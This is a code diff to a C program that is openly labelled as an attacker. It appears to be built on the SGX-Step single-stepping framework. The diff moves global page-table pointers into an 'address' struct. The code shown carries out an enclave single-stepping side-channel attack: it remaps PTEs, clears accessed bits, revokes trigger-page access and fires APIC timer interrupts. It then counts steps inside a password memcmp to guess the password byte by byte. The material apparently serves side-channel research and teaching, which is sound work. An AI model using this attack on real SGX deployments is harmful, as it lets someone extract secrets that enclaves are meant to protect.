@@ -37,8 +37,6 @@
 #endif
 
 sgx_enclave_id_t eid = 0;
-uint64_t *pte_encl = NULL, *pte_trigger = NULL, *pmd_encl = NULL;
-void *code_adrs, *trigger_adrs;
 
 /* ================== ATTACKER IRQ/FAULT HANDLERS ================= */
 
@@ -51,7 +49,7 @@ void aep_cb_func(void)
 
     #if DEBUG
         uint64_t erip = edbgrd_erip() - (uint64_t) get_enclave_base();
-        info("^^ enclave RIP=%#llx; ACCESSED=%d", erip, ACCESSED(*pte_encl));
+        info("^^ enclave RIP=%#llx; ACCESSED=%d", erip, ACCESSED(*address.pte_encl));
     #endif
     counter.irq_cnt++;
 
@@ -62,7 +60,7 @@ void aep_cb_func(void)
 	    counter.do_irq = 0;
     }
 
-    if (ACCESSED(*pte_encl) && ACCESSED(*pte_trigger))
+    if (ACCESSED(*address.pte_encl) && ACCESSED(*address.pte_trigger))
     {
         counter.trigger_cnt++;
     }
@@ -76,9 +74,9 @@ void aep_cb_func(void)
      * referencing the enclave code page about to be executed, so as to be able
      * to filter out "zero-step" results that won't set the accessed bit.
      */
-    if (counter.do_irq && ACCESSED(*pte_encl)) counter.step_cnt++;
-    *pte_encl = MARK_NOT_ACCESSED( *pte_encl );
-    *pte_trigger = MARK_NOT_ACCESSED(*pte_trigger);
+    if (counter.do_irq && ACCESSED(*address.pte_encl)) counter.step_cnt++;
+    *address.pte_encl = MARK_NOT_ACCESSED( *address.pte_encl );
+    *address.pte_trigger = MARK_NOT_ACCESSED(*address.pte_trigger);
 
     /*
      * Configure APIC timer interval for next interrupt.
@@ -91,7 +89,7 @@ void aep_cb_func(void)
      */
     if (counter.do_irq)
     {
-        *pmd_encl = MARK_NOT_ACCESSED( *pmd_encl );
+        *address.pmd_encl = MARK_NOT_ACCESSED( *address.pmd_encl );
 #if DO_TIMER_STEP
         apic_timer_irq( SGX_STEP_TIMER_INTERVAL );
 #endif
@@ -117,11 +115,11 @@ void sigsegv_fault_handler(siginfo_t *si, ucontext_t *uc) {
     info("Caught page fault (base address=%p)", si->si_addr);
 #endif
 
-    if (si->si_addr == trigger_adrs) {
+    if (si->si_addr == address.trigger_adrs) {
 #if DEBUG
         info("Restoring trigger access rights..");
 #endif
-        ASSERT(!mprotect(trigger_adrs, 4096, PROT_READ | PROT_WRITE));
+        ASSERT(!mprotect(address.trigger_adrs, 4096, PROT_READ | PROT_WRITE));
         counter.do_irq = 1;
         sgx_step_do_trap = 1;
     } else {
@@ -148,25 +146,25 @@ void attacker_config_runtime(void)
 /* Provoke page fault on enclave entry to initiate single-stepping mode. */
 void attacker_config_page_table(void)
 {
-    code_adrs = get_symbol_offset("my_memcmp") + get_enclave_base();
-    trigger_adrs = get_symbol_offset("trigger_page") + get_enclave_base();
-    info("enclave trigger at %p; code at %p", trigger_adrs, code_adrs);
+    address.code_adrs = get_symbol_offset("my_memcmp") + get_enclave_base();
+    address.trigger_adrs = get_symbol_offset("trigger_page") + get_enclave_base();
+    info("enclave trigger at %p; code at %p", address.trigger_adrs, address.code_adrs);
 
-    ASSERT( pte_encl    = remap_page_table_level( code_adrs, PTE) );
-    ASSERT( PRESENT(*pte_encl) );
-    *pte_encl = MARK_NOT_ACCESSED(*pte_encl);
-    info("enclave code at %p with PTE", code_adrs);
-    print_pte_adrs( code_adrs );
+    ASSERT( address.pte_encl    = remap_page_table_level( address.code_adrs, PTE) );
+    ASSERT( PRESENT(*address.pte_encl) );
+    *address.pte_encl = MARK_NOT_ACCESSED(*address.pte_encl);
+    info("enclave code at %p with PTE", address.code_adrs);
+    print_pte_adrs( address.code_adrs );
 
-    ASSERT( pte_trigger = remap_page_table_level( trigger_adrs, PTE) );
-    ASSERT( PRESENT(*pte_trigger) );
-    *pte_trigger = MARK_NOT_ACCESSED(*pte_trigger);
-    ASSERT(!mprotect(trigger_adrs, 4096, PROT_NONE ));
-    info("enclave trigger at %p with PTE", trigger_adrs);
-    print_pte_adrs( trigger_adrs );
+    ASSERT( address.pte_trigger = remap_page_table_level( address.trigger_adrs, PTE) );
+    ASSERT( PRESENT(*address.pte_trigger) );
+    *address.pte_trigger = MARK_NOT_ACCESSED(*address.pte_trigger);
+    ASSERT(!mprotect(address.trigger_adrs, 4096, PROT_NONE ));
+    info("enclave trigger at %p with PTE", address.trigger_adrs);
+    print_pte_adrs( address.trigger_adrs );
 
-    ASSERT( pmd_encl = remap_page_table_level( get_enclave_base(), PMD) );
-    ASSERT( PRESENT(*pmd_encl) );
+    ASSERT( address.pmd_encl = remap_page_table_level( get_enclave_base(), PMD) );
+    ASSERT( PRESENT(*address.pmd_encl) );
 }
 
 /* ================== ATTACKER MAIN ================= */
@@ -211,7 +209,7 @@ int main( int argc, char **argv )
         pwd[pwd_len] = '\0';
         counter.do_irq = 0; counter.trigger_cnt = 0, counter.step_cnt = 0, counter.fault_cnt = 0;
         sgx_step_do_trap = 0;
-        ASSERT(!mprotect(trigger_adrs, 4096, PROT_NONE ));
+        ASSERT(!mprotect(address.trigger_adrs, 4096, PROT_NONE ));
         SGX_ASSERT( memcmp_pwd(eid, &pwd_success, pwd) );
 
         #if DEBUG
@@ -239,7 +237,7 @@ int main( int argc, char **argv )
             pwd[i] = j;
             counter.do_irq = 0; counter.trigger_cnt = 0, counter.step_cnt = 0, counter.fault_cnt = 0;
             sgx_step_do_trap = 0;
-            ASSERT(!mprotect(trigger_adrs, 4096, PROT_NONE ));
+            ASSERT(!mprotect(address.trigger_adrs, 4096, PROT_NONE ));
             SGX_ASSERT( memcmp_pwd(eid, &pwd_success, pwd) );
 
             #if DEBUG
